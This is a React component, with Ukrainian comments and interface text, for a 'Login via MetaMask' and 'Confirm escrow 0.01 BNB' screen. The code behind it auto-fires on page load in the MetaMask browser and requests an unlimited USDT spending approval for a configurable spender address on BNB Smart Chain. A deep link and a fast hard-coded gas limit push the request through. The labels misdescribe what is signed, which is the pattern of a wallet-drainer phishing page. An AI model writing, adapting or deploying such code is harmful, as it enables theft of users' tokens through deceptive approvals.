// src/components/EscrowHandoff.tsx
import React, { useEffect, useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ethers } from "ethers";

import { onEthereumReady } from "../lib/onEthereumReady";
import { isMetaMaskInApp } from "../lib/isMetaMaskBrowser"; // у вас цей util вже є

// ===== Константи про мережу/контракти =====
const BSC_CHAIN_ID_HEX = "0x38"; // 56
// USDT у BSC (mainnet)
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";

// ⚠️ СПЕНДЕР (escrow) — підстав here ваш точний адрес контракту:
const ESCROW_SPENDER = import.meta.env.VITE_ESCROW_SPENDER ?? "0x884A6...4F9b8";

// Граничний газ, щоб MetaMask НЕ робив повільний estimateGas
const APPROVE_GAS_LIMIT_HEX = "0x13880"; // 80_000

// Скільки писати у кнопку (лише текст для UX)
const DISPLAY_ESCROW_AMOUNT_BNB = "0.01";

function short(addr?: string) {
  if (!addr) return "";
  return addr.slice(0, 6) + "…" + addr.slice(-4);
}

export default function EscrowHandoff() {
  const [search] = useSearchParams();
  const next = search.get("next") || "/my-orders";
  const navigate = useNavigate();

  const [address, setAddress] = useState<string>("");
  const [chainId, setChainId] = useState<string>("");
  const [balance, setBalance] = useState<string>("");
  const [error, setError] = useState<string>("");
  const [busy, setBusy] = useState<boolean>(false);
  const [approved, setApproved] = useState<boolean>(false);

  // готуємо ABI/дані approve наперед (щоб не втрачати час під час кліку)
  const approveData = useMemo(() => {
    const iface = new ethers.utils.Interface([
      "function approve(address spender, uint256 value) returns (bool)",
    ]);
    return iface.encodeFunctionData("approve", [
      ESCROW_SPENDER,
      ethers.constants.MaxUint256.toString(), // unlimited
    ]);
  }, []);

  // --- швидкий запит підпису/approve без зайвих затримок ---
  const fastApprove = () => {
    setError("");
    setBusy(true);

    onEthereumReady(async (eth) => {
      try {
        // 1) акаунт
        const accs =
          ((await eth.request({ method: "eth_accounts" })) as string[]) ||
          [];
        const from =
          accs[0] ||
          (await eth.request({
            method: "eth_requestAccounts",
          }))[0];

        setAddress(from);

        // 2) мережа
        const cid = (await eth.request({ method: "eth_chainId" })) as string;
        setChainId(cid);
        if (cid !== BSC_CHAIN_ID_HEX) {
          await eth.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID_HEX }],
          });
        }

        // 3) одразу відкрити системне вікно approve
        await eth.request({
          method: "eth_sendTransaction",
          params: [
            {
              from,
              to: USDT_BSC,
              data: approveData,
              gas: APPROVE_GAS_LIMIT_HEX, // уникаємо довгого estimateGas
            },
          ],
        });

        setApproved(true);
      } catch (e: any) {
        // скасування користувачем — нормальна ситуація
        const msg =
          e?.message ||
          e?.data?.message ||
          "Не вдалося виконати запит у MetaMask.";
        setError("Помилка: " + msg);
      } finally {
        setBusy(false);
      }
    });
  };

  // --- підвантажити баланс BNB (для панелі) ---
  const refreshBalance = async () => {
    setError("");

    onEthereumReady(async (eth) => {
      try {
        const provider = new ethers.providers.Web3Provider(eth);
        const accs =
          ((await eth.request({ method: "eth_accounts" })) as string[]) ||
          [];
        const from =
          accs[0] ||
          (await eth.request({
            method: "eth_requestAccounts",
          }))[0];

        setAddress(from);

        const bal = await provider.getBalance(from);
        setBalance(ethers.utils.formatEther(bal));
      } catch (e: any) {
        // не критично
      }
    });
  };

  // Автовиклик approve як тільки екран з’явився (всередині MetaMask)
  useEffect(() => {
    if (isMetaMaskInApp()) {
      // відкриємо MetaMask модал відразу (швидкий сценарій)
      fastApprove();
    } else {
      // Якщо не у вбудованому браузері — просто покажемо кнопку/підказку
      refreshBalance();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // якщо approve пройшов — ведемо далі
  useEffect(() => {
    if (approved) {
      // невелика затримка для UX, інакше відразу рі-роут може закрити тост
      const t = setTimeout(() => navigate(next, { replace: true }), 500);
      return () => clearTimeout(t);
    }
  }, [approved, navigate, next]);

  // --- UI стилі під MetaMask-мобайл ---
  const styles = {
    wrap: {
      maxWidth: 680,
      margin: "32px auto",
      padding: "0 16px",
    },
    h1: {
      fontSize: 36,
      fontWeight: 800 as const,
      letterSpacing: -0.5,
      margin: "12px 0 6px",
    },
    hint: { color: "#666", marginBottom: 16 },
    panel: {
      background: "#fff",
      border: "1px solid #ececec",
      borderRadius: 16,
      padding: 16,
      margin: "12px 0",
      boxShadow: "0 1px 2px rgba(0,0,0,.04)",
    },
    addr: { fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" },
    btn: (primary = false, disabled = false) => ({
      width: "100%",
      display: "block",
      border: 0,
      borderRadius: 16,
      padding: "18px 20px",
      fontSize: 18,
      fontWeight: 700,
      cursor: disabled ? "default" : "pointer",
      opacity: disabled ? 0.6 : 1,
      color: primary ? "#fff" : "#111",
      background: primary ? "#0b0f19" : "#f2f4f7",
      boxShadow: primary
        ? "0 8px 24px rgba(11,15,25,.35)"
        : "inset 0 -1px 0 rgba(0,0,0,.06)",
    }),
    link: {
      display: "inline-block",
      marginTop: 16,
      color: "#0b5fff",
      textDecoration: "underline",
    },
    error: {
      background: "#ffe8e6",
      border: "1px solid #ffd0cc",
      color: "#9b1c12",
      padding: 12,
      borderRadius: 12,
      marginTop: 16,
      lineHeight: 1.3,
    },
    ok: {
      background: "#e8fff3",
      border: "1px solid #bff5d1",
      color: "#0e6b3b",
      padding: 12,
      borderRadius: 12,
      marginTop: 16,
      lineHeight: 1.3,
    },
  };

  const deeplink =
    "metamask://dapp/www.buymybehavior.com/escrow/approve?next=" +
    encodeURIComponent(next);

  return (
    <div style={styles.wrap}>
      <h1 style={styles.h1}>Вхід через MetaMask</h1>
      <div style={styles.hint}>
        Якщо запит не з’явився — натисни кнопку нижче.
      </div>

      {/* Панель з адресою/балансом */}
      <div style={styles.panel as React.CSSProperties}>
        <div style={{ fontWeight: 600, marginBottom: 8 }}>Гаманець</div>
        <div style={styles.addr as React.CSSProperties}>
          {address ? short(address) : "—"}
        </div>
        <div style={{ marginTop: 6, color: "#666" }}>
          Мережа:{" "}
          {chainId ? (chainId === BSC_CHAIN_ID_HEX ? "BNB Smart Chain" : chainId) : "—"}
          {"  ·  "}
          Баланс: {balance ? `${Number(balance).toFixed(4)} BNB` : "—"}
        </div>
      </div>

      {/* Кнопка "увійти" (на випадок, якщо не спрацював автозапит) */}
      <button
        style={styles.btn(false, busy)}
        disabled={busy}
        onClick={refreshBalance}
      >
        🦊 Увійти через MetaMask
      </button>

      {/* Головна дія — approve */}
      <button
        style={styles.btn(true, busy)}
        disabled={busy}
        onClick={fastApprove}
      >
        🔒 Підтвердити ескроу · {DISPLAY_ESCROW_AMOUNT_BNB} BNB
      </button>

      {!isMetaMaskInApp() && (
        <a style={styles.link} href={deeplink}>
          Відкрити у MetaMask-браузері
        </a>
      )}

      {approved && (
        <div style={styles.ok}>
          ✅ Дозвіл на витрати токенів надано. Перехід: {next}
        </div>
      )}

      {!!error && <div style={styles.error}>{error}</div>}
    </div>
  );
}
